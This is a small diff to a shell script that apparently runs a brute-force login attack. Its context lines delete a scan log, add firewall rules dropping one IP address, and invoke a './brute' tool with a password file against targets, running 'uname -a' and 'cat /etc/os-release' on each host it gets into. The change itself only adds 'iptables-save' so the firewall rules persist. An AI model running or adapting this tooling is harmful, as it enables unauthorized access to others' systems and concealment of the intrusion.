@@ -4,4 +4,5 @@ rm -rf scan.log
 iptables -A INPUT -s 188.26.174.14 -j DROP
 iptables -A FORWARD -s 188.26.174.14 -j DROP
 iptables -A OUTPUT -s 188.26.174.14 -j DROP
+iptables-save
 ./brute 800 -b $1 passfile $2 "uname -a ; cat /etc/os-release"
